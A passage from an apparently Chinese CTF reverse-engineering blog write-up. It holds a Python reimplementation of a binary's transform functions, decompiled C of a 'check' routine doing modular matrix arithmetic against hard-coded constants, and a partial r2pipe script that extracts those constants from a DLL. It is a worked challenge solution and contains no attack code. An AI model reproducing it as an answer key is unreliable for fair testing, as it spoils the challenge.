class="number">0</span>] = <span class="number">1</span></span><br><span class="line">    v2 = <span class="built_in">bytearray</span>(<span class="number">64</span>)</span><br><span class="line">    v2[<span class="number">32</span>:] = inp</span><br><span class="line">    <span class="keyword">for</span> byte_idx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        byte_val = key[byte_idx]</span><br><span class="line">        <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">            <span class="keyword">if</span> (byte_val &gt;&gt; bit) &amp; <span class="number">1</span>:</span><br><span class="line">                v3 = poly_mul(v3, v2[<span class="number">32</span>:])</span><br><span class="line">            v2[<span class="number">32</span>:] = poly_mul(v2[<span class="number">32</span>:], v2[<span class="number">32</span>:])</span><br><span class="line">    result = v3</span><br><span class="line">    result[<span class="number">0</span>] ^= tag ^ <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">apply_config_from_file</span>(<span class="params">config_id, initial_inp_hex</span>):</span><br><span class="line">    filepath = os.path.join(<span class="string">&quot;consts&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;config_id&#125;</span>.txt&quot;</span>)</span><br><span class="line">    inp = <span class="built_in">bytearray</span>.fromhex(initial_inp_hex.strip())</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath, <span class="string">&quot;r&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f: lines = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> line_num, line <span class="keyword">in</span> <span class="built_in">enumerate</span>(lines, <span class="number">1</span>):</span><br><span class="line">        line = line.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line <span class="keyword">or</span> line.startswith(<span class="string">&quot;#&quot;</span>): <span class="keyword">continue</span></span><br><span class="line">        parts = line.split(<span class="string">&quot;\t&quot;</span>)</span><br><span class="line">        func_type = parts[<span class="number">1</span>].strip()</span><br><span class="line">        qkey_str = parts[<span class="number">2</span>].strip()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            qkey = ast.literal_eval(qkey_str)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e: <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Failed to parse qkey at line <span class="subst">&#123;line_num&#125;</span>: <span class="subst">&#123;qkey_str&#125;</span>&quot;</span>) <span class="keyword">from</span> e</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(qkey, <span class="built_in">list</span>): <span class="keyword">raise</span> TypeError(<span class="string">f&quot;qkey must be a list at line <span class="subst">&#123;line_num&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> func_type == <span class="string">&quot;A&quot;</span>: inp = func_A(inp, qkey)</span><br><span class="line">        <span class="keyword">elif</span> func_type == <span class="string">&quot;B&quot;</span>: inp = func_B(inp, qkey)</span><br><span class="line">        <span class="keyword">elif</span> func_type == <span class="string">&quot;C&quot;</span>: inp = func_C(inp, qkey)</span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Unknown function type &#x27;<span class="subst">&#123;func_type&#125;</span>&#x27; at line <span class="subst">&#123;line_num&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> inp</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python script.py &lt;id&gt; &lt;input(hex)&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    config_id = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> config_id.isdigit() <span class="keyword">or</span> <span class="built_in">len</span>(config_id) != <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: ID must be a 4-digit number (e.g., 0000)&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    initial_inp_hex = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = apply_config_from_file(config_id, initial_inp_hex)</span><br><span class="line">        <span class="built_in">print</span>(result.<span class="built_in">hex</span>())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>, file=sys.stderr)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>发现运行结果相同</p>
<h3 id="9-5-2-后半部分"><a href="#9-5-2-后半部分" class="headerlink" title="#9.5.2 后半部分"></a>#9.5.2 后半部分</h3><p>继续查看check的后半段：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line">  tag1 = <span class="number">0xC78F79F3C2DE8CA7LL</span>;</span><br><span class="line">  tag2 = <span class="number">0x900155FC1FE04EADLL</span>;</span><br><span class="line">  v89[<span class="number">0</span>] = <span class="number">0x12B3A6E563A54C8AuLL</span>;</span><br><span class="line">  v89[<span class="number">1</span>] = <span class="number">0x83D939BA98B1E883LL</span>;</span><br><span class="line">  v89[<span class="number">2</span>] = <span class="number">0x7886CD454720813BuLL</span>;</span><br><span class="line">  v89[<span class="number">3</span>] = <span class="number">0x7998EFD66FF8A530uLL</span>;</span><br><span class="line">  v89[<span class="number">4</span>] = <span class="number">0x1A0FD2225B5649F3uLL</span>;</span><br><span class="line">  v89[<span class="number">5</span>] = <span class="number">0x7FA833612DC9F78BuLL</span>;</span><br><span class="line">  v89[<span class="number">6</span>] = <span class="number">0xBB0F8B983D445D10LL</span>;</span><br><span class="line">  v89[<span class="number">7</span>] = <span class="number">0xFE710C8D73876CE2LL</span>;</span><br><span class="line">  v89[<span class="number">8</span>] = <span class="number">0xE3DD29A65E3FE661LL</span>;</span><br><span class="line">  v89[<span class="number">9</span>] = <span class="number">0xB67BDAB54A677B84LL</span>;</span><br><span class="line">  v89[<span class="number">10</span>] = <span class="number">0x6320D9C38BAC5A6AuLL</span>;</span><br><span class="line">  v89[<span class="number">11</span>] = <span class="number">0xF087EC1927E12C0uLL</span>;</span><br><span class="line">  v89[<span class="number">12</span>] = <span class="number">0x5F0E2A1F46DBD2FFuLL</span>;</span><br><span class="line">  v89[<span class="number">13</span>] = <span class="number">0x690726E48B96FA42uLL</span>;</span><br><span class="line">  v89[<span class="number">14</span>] = <span class="number">0x86761ABD847AD9C9LL</span>;</span><br><span class="line">  v89[<span class="number">15</span>] = <span class="number">0xF71197E894C6D650LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = *((_QWORD *)&amp;v86[i + <span class="number">64</span>] + <span class="number">1</span>);</span><br><span class="line">    v6 = &amp;v86[i + <span class="number">64</span>];</span><br><span class="line">    *(_QWORD *)v6 ^= *(_QWORD *)(<span class="number">8LL</span> * (i % <span class="number">4</span>) + a5);</span><br><span class="line">    *((_QWORD *)v6 + <span class="number">1</span>) = v5;</span><br><span class="line">    <span class="keyword">if</span> ( v86[i + <span class="number">64</span>] &gt;= tag1 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v91 = <span class="number">0u</span>;</span><br><span class="line">  v8 = v89[<span class="number">0</span>];</span><br><span class="line">  v9 = v89[<span class="number">5</span>];</span><br><span class="line">  v85 = v89[<span class="number">15</span>] * v89[<span class="number">10</span>];</span><br><span class="line">  v84 = tag1;</span><br><span class="line">  *(<span class="type">double</span> *)a<span class="number">2.</span>m128_u64 = <span class="built_in">sub_3B65C0290</span>(*((_QWORD *)&amp;v89[<span class="number">5</span>] + <span class="number">1</span>), *(_QWORD *)&amp;v89[<span class="number">5</span>], &amp;v84, &amp;v85);</span><br><span class="line">  v85 = *(_OWORD *)&amp;a2 * v9;</span><br><span class="line">  v84 = tag1;</span><br><span class="line">  *(<span class="type">double</span> *)a<span class="number">2.</span>m128_u64 = <span class="built_in">sub_3B65C0290</span>(*((_QWORD *)&amp;v9 + <span class="number">1</span>), v9, &amp;v84, &amp;v85);</span><br><span class="line">  v80 = a2;</span><br><span class="line">  v10 = v89[<span class="number">6</span>];</span><br><span class="line">  v85 = v89[<span class="number">13</span>] * v89[<span class="number">11</span>];</span><br><span class="line">  v84 = tag1;</span><br><span class="line">...</span><br><span class="line">  v85 = *(_OWORD *)&amp;a2 * v13;</span><br><span class="line">  v84 = tag1;</span><br><span class="line">  *(<span class="type">double</span> *)a<span class="number">2.</span>m128_u64 = <span class="built_in">sub_3B65C0290</span>(*((_QWORD *)&amp;v13 + <span class="number">1</span>), v13, &amp;v84, &amp;v85);</span><br><span class="line">  v14 = a2;</span><br><span class="line">  v15 = v89[<span class="number">15</span>];</span><br><span class="line">  v85 = v89[<span class="number">6</span>] * v89[<span class="number">9</span>];</span><br><span class="line">  v84 = tag1;</span><br><span class="line">  *(<span class="type">double</span> *)a<span class="number">2.</span>m128_u64 = <span class="built_in">sub_3B65C0290</span>(*((_QWORD *)&amp;v89[<span class="number">15</span>] + <span class="number">1</span>), *(_QWORD *)&amp;v89[<span class="number">15</span>], &amp;v84, &amp;v85);</span><br><span class="line">  v85 = *(_OWORD *)&amp;a2 * v15;</span><br><span class="line">  v84 = tag1;</span><br><span class="line">  *(<span class="type">double</span> *)a<span class="number">2.</span>m128_u64 = <span class="built_in">sub_3B65C0290</span>(*((_QWORD *)&amp;v15 + <span class="number">1</span>), v15, &amp;v84, &amp;v85);</span><br><span class="line">  v85 = *(_OWORD *)&amp;v14 + *(_OWORD *)&amp;a2;</span><br><span class="line">  v84 = tag1;</span><br><span class="line">  *(<span class="type">double</span> *)a<span class="number">2.</span>m128_u64 = <span class="built_in">sub_3B65C0290</span>(*((_QWORD *)&amp;v15 + <span class="number">1</span>), v15, &amp;v84, &amp;v85);</span><br><span class="line">  v85 = *(_OWORD *)&amp;v68 + *(_OWORD *)&amp;a2;</span><br><span class="line">  v84 = tag1;</span><br><span class="line">...</span><br><span class="line">  *(<span class="type">double</span> *)a<span class="number">2.</span>m128_u64 = <span class="built_in">sub_3B65C0290</span>(*((_QWORD *)&amp;Buf2 + <span class="number">1</span>), Buf2, &amp;v84, &amp;v85);</span><br><span class="line">  v91 = a2;</span><br><span class="line">  <span class="keyword">if</span> ( *(_OWORD *)&amp;a2 == <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  Size[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Size[<span class="number">1</span>], <span class="number">0</span>, <span class="number">72</span>);</span><br><span class="line">  Size[<span class="number">10</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Size[<span class="number">11</span>], <span class="number">0</span>, <span class="number">72</span>);</span><br><span class="line">  Size[<span class="number">20</span>] = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Size[<span class="number">21</span>], <span class="number">0</span>, <span class="number">72</span>);</span><br><span class="line">  Size[<span class="number">30</span>] = <span class="number">1</span>;</span><br><span class="line">  Size[<span class="number">31</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(buf_, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf_));</span><br><span class="line">  <span class="keyword">for</span> ( n15_1 = <span class="number">0</span>; n15_1 &lt;= <span class="number">15</span>; ++n15_1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v40 = *((_QWORD *)&amp;v86[n15_1 + <span class="number">64</span>] + <span class="number">1</span>);</span><br><span class="line">    v41 = &amp;v86[n15_1 + <span class="number">32</span>];</span><br><span class="line">    *(_QWORD *)v41 = *(_QWORD *)&amp;v86[n15_1 + <span class="number">64</span>];</span><br><span class="line">    *((_QWORD *)v41 + <span class="number">1</span>) = v40;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( n63 = <span class="number">0</span>; n63 &lt;= <span class="number">63</span>; ++n63 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (tag2 &gt;&gt; n63) &amp; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( n3_2 = <span class="number">0</span>; n3_2 &lt;= <span class="number">3</span>; ++n3_2 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( n3_1 = <span class="number">0</span>; n3_1 &lt;= <span class="number">3</span>; ++n3_1 )</span><br><span class="line">        &#123;</span><br><span class="line">          v42 = &amp;v86[<span class="number">4</span> * n3_2 + <span class="number">16</span> + n3_1];</span><br><span class="line">          *(_QWORD *)v42 = <span class="number">0</span>;</span><br><span class="line">          *((_QWORD *)v42 + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">          n3 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">while</span> ( n3 &lt;= <span class="number">3</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v43 = *(_QWORD *)&amp;v86[<span class="number">4</span> * n3_2 + <span class="number">16</span> + n3_1];</span><br><span class="line">            v44 = *((_QWORD *)&amp;v86[<span class="number">4</span> * n3_2 + <span class="number">16</span> + n3_1] + <span class="number">1</span>);</span><br><span class="line">            v45 = *(_QWORD *)&amp;v86[<span class="number">4</span> * n3_2 + <span class="number">48</span> + n3];</span><br><span class="line">            v46 = *(_QWORD *)&amp;v86[<span class="number">4</span> * n3 + <span class="number">32</span> + n3_1];</span><br><span class="line">            v47 = v46 * *((_QWORD *)&amp;v86[<span class="number">4</span> * n3_2 + <span class="number">48</span> + n3] + <span class="number">1</span>) + v45 * *((_QWORD *)&amp;v86[<span class="number">4</span> * n3 + <span class="number">32</span> + n3_1] + <span class="number">1</span>);</span><br><span class="line">            v48 = v46 * (<span class="type">unsigned</span> __int128)v45;</span><br><span class="line">            *((_QWORD *)&amp;v48 + <span class="number">1</span>) += v47;</span><br><span class="line">            v85 = v48;</span><br><span class="line">            v84 = tag1;</span><br><span class="line">            *(<span class="type">double</span> *)a<span class="number">2.</span>m128_u64 = <span class="built_in">sub_3B65C0290</span>(v44, v43, &amp;v84, &amp;v85);</span><br><span class="line">            *(_QWORD *)&amp;v49 = v43;</span><br><span class="line">            *((_QWORD *)&amp;v49 + <span class="number">1</span>) = v44;</span><br><span class="line">            v50 = <span class="number">16LL</span> * (<span class="number">4</span> * n3_2 + n3_1) + <span class="number">1328</span>;</span><br><span class="line">            *(__int128 *)((<span class="type">char</span> *)&amp;v86[<span class="number">-67</span>] + v50) = *(_OWORD *)&amp;a2 + v49;</span><br><span class="line">            v51 = (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">4</span> * n3_2 + n3_1);</span><br><span class="line">            v85 = v86[<span class="number">4</span> * n3_2 + <span class="number">16</span> + n3_1];</span><br><span class="line">            v84 = tag1;</span><br><span class="line">            *(<span class="type">double</span> *)a<span class="number">2.</span>m128_u64 = <span class="built_in">sub_3B65C0290</span>(v50, v51, &amp;v84, &amp;v85);</span><br><span class="line">            v86[(<span class="type">int</span>)v51 + <span class="number">16</span>] = (__int128)a2;</span><br><span class="line">            ++n3;</span><br><span class="line">            Buf2 = __PAIR128__(&amp;v86[<span class="number">4</span>], v51);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> ( n15_2 = <span class="number">0</span>; n15_2 &lt;= <span class="number">15</span>; ++n15_2 )</span><br><span class="line">      &#123;</span><br><span class="line">        v52 = *((_QWORD *)&amp;v86[n15_2 + <span class="number">16</span>] + <span class="number">1</span>);</span><br><span class="line">        v53 = <span class="number">16LL</span> * n15_2 + <span class="number">1328</span>;</span><br><span class="line">        v54 = (_QWORD *)((<span class="type">char</span> *)&amp;v86[<span class="number">-35</span>] + v53);</span><br><span class="line">        *v54 = *(_QWORD *)((<span class="type">char</span> *)&amp;v86[<span class="number">-67</span>] + v53);</span><br><span class="line">        v54[<span class="number">1</span>] = v52;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( n3_5 = <span class="number">0</span>; n3_5 &lt;= <span class="number">3</span>; ++n3_5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( n3_4 = <span class="number">0</span>; n3_4 &lt;= <span class="number">3</span>; ++n3_4 )</span><br><span class="line">      &#123;</span><br><span class="line">        v55 = &amp;v86[<span class="number">4</span> * n3_5 + <span class="number">16</span> + n3_4];</span><br><span class="line">        *(_QWORD *)v55 = <span class="number">0</span>;</span><br><span class="line">        *((_QWORD *)v55 + <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">        n3_3 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> ( n3_3 &lt;= <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v56 = *(_QWORD *)&amp;v86[<span class="number">4</span> * n3_5 + <span class="number">16</span> + n3_4];</span><br><span class="line">          v57 = *((_QWORD *)&amp;v86[<span class="number">4</span> * n3_5 + <span class="number">16</span> + n3_4] + <span class="number">1</span>);</span><br><span class="line">          v58 = *(_QWORD *)&amp;v86[<span class="number">4</span> * n3_5 + <span class="number">32</span> + n3_3];</span><br><span class="line">          v59 = *(_QWORD *)&amp;v86[<span class="number">4</span> * n3_3 + <span class="number">32</span> + n3_4];</span><br><span class="line">          v60 = v59 * *((_QWORD *)&amp;v86[<span class="number">4</span> * n3_5 + <span class="number">32</span> + n3_3] + <span class="number">1</span>) + v58 * *((_QWORD *)&amp;v86[<span class="number">4</span> * n3_3 + <span class="number">32</span> + n3_4] + <span class="number">1</span>);</span><br><span class="line">          v61 = v59 * (<span class="type">unsigned</span> __int128)v58;</span><br><span class="line">          *((_QWORD *)&amp;v61 + <span class="number">1</span>) += v60;</span><br><span class="line">          v85 = v61;</span><br><span class="line">          v84 = tag1;</span><br><span class="line">          *(<span class="type">double</span> *)a<span class="number">2.</span>m128_u64 = <span class="built_in">sub_3B65C0290</span>(v57, v56, &amp;v84, &amp;v85);</span><br><span class="line">          *(_QWORD *)&amp;v62 = v56;</span><br><span class="line">          *((_QWORD *)&amp;v62 + <span class="number">1</span>) = v57;</span><br><span class="line">          v63 = <span class="number">16LL</span> * (<span class="number">4</span> * n3_5 + n3_4) + <span class="number">1328</span>;</span><br><span class="line">          *(__int128 *)((<span class="type">char</span> *)&amp;v86[<span class="number">-67</span>] + v63) = *(_OWORD *)&amp;a2 + v62;</span><br><span class="line">          v64 = (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">4</span> * n3_5 + n3_4);</span><br><span class="line">          v85 = v86[<span class="number">4</span> * n3_5 + <span class="number">16</span> + n3_4];</span><br><span class="line">          v84 = tag1;</span><br><span class="line">          *(<span class="type">double</span> *)a<span class="number">2.</span>m128_u64 = <span class="built_in">sub_3B65C0290</span>(v63, v64, &amp;v84, &amp;v85);</span><br><span class="line">          v86[(<span class="type">int</span>)v64 + <span class="number">16</span>] = (__int128)a2;</span><br><span class="line">          ++n3_3;</span><br><span class="line">          Buf2 = __PAIR128__(&amp;v86[<span class="number">4</span>], v64);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( n15_3 = <span class="number">0</span>; n15_3 &lt;= <span class="number">15</span>; ++n15_3 )</span><br><span class="line">    &#123;</span><br><span class="line">      v65 = *((_QWORD *)&amp;v86[n15_3 + <span class="number">16</span>] + <span class="number">1</span>);</span><br><span class="line">      v66 = <span class="number">16LL</span> * n15_3 + <span class="number">1328</span>;</span><br><span class="line">      v67 = (_QWORD *)((<span class="type">char</span> *)&amp;v86[<span class="number">-51</span>] + v66);</span><br><span class="line">      *v67 = *(_QWORD *)((<span class="type">char</span> *)&amp;v86[<span class="number">-67</span>] + v66);</span><br><span class="line">      v67[<span class="number">1</span>] = v65;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v86[<span class="number">0</span>] = <span class="number">0x1EFB0F7A200D7EFEuLL</span>;</span><br><span class="line">  v86[<span class="number">1</span>] = <span class="number">0x628B24B42C976293uLL</span>;</span><br><span class="line">  v86[<span class="number">2</span>] = <span class="number">0x433F2C4519786852uLL</span>;</span><br><span class="line">  v86[<span class="number">3</span>] = <span class="number">0xAACB9CE48EECB631LL</span>;</span><br><span class="line">  v86[<span class="number">4</span>] = <span class="number">0xA8324E2FA37A6B68LL</span>;</span><br><span class="line">  v86[<span class="number">5</span>] = <span class="number">0xBC2191FD6C58F3A5LL</span>;</span><br><span class="line">  v86[<span class="number">6</span>] = <span class="number">0xC19604E77EE4FE00LL</span>;</span><br><span class="line">  v86[<span class="number">7</span>] = <span class="number">0x15E04D3A1DC1FA68uLL</span>;</span><br><span class="line">  v86[<span class="number">8</span>] = <span class="number">0x5625BF80AD7B7CFEuLL</span>;</span><br><span class="line">  v86[<span class="number">9</span>] = <span class="number">0xB2D8A8637CB92E09LL</span>;</span><br><span class="line">  v86[<span class="number">10</span>] = <span class="number">0xA9ACEECB13AB347FLL</span>;</span><br><span class="line">  v86[<span class="number">11</span>] = <span class="number">0x8E2553EF7F93165uLL</span>;</span><br><span class="line">  v86[<span class="number">12</span>] = <span class="number">0xC0320352C3ED124ELL</span>;</span><br><span class="line">  v86[<span class="number">13</span>] = <span class="number">0xBF1B7A608553A3B5LL</span>;</span><br><span class="line">  v86[<span class="number">14</span>] = <span class="number">0xA2F294667D086695LL</span>;</span><br><span class="line">  v86[<span class="number">15</span>] = <span class="number">0xC149DEB785270E1DLL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">memcmp</span>(*((<span class="type">const</span> <span class="type">void</span> **)&amp;Buf2 + <span class="number">1</span>), (<span class="type">const</span> <span class="type">void</span> *)Buf2, (<span class="type">size_t</span>)Size) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在check的下半段中，一共有16+16个oword作为密钥&#x2F;密文，3个oword&#x2F;qword作为tag类的标签，编写脚本提取check中的34个常量（有一个tag初始化为0）：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> r2pipe</span><br><span class="line"></span><br><span class="line">os.makedirs(<span class="string">&quot;consts_check&quot;</span>, exist_ok=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">analyze_check_function</span>(<span class="params">dll_path: <span class="built_in">str</span></span>):</span><br><span class="line">    r2 = r2pipe.<span class="built_in">open</span>(dll_path, flags=[<span class="string">&#x27;-e&#x27;</span>, <span class="string">&#x27;bin.relocs.apply=true&#x27;</span>])</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        exports = r2.cmdj(<span class="string">&quot;iEj&quot;</span>)</span><br><span class="line">        target = <span class="built_in">next</span>((e <span class="keyword">for</span> e <span class="keyword">in</span> exports <span class="keyword">if</span> e.get(<span class="string">&quot;name&quot;</span>) == <span class="string">&quot;_Z5checkPh&quot;</span>), <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> target:</span><br><span class="line">            <span class="keyword">return</span> []</span><br><span class="line">        vaddr = target[<span class="string">&quot;vaddr&quot;</span>]</span><br><span class="line">        r2.cmd(<span class="string">f&quot;af @ <span class="subst">&#123;vaddr&#125;</span>&quot;</span>)</span><br><span class="line">        disasm = r2.cmd(<span class="string">f&quot;pdr @ <span class="subst">&#123;vaddr&#125;</span>&quot;</span>)</span><br><span class="line">        movabs_pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;movabs\s+rax,\s*(0x[0-9a-fA-F]+)&#x27;</span>)</span><br><span class="line">        constants = []</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> disasm.splitlines():</span><br><span class="line">            <span class="keyword">match</span> = movabs_pattern.search(line)</span><br><span class="line">            <span class="keyword">if</span> <span 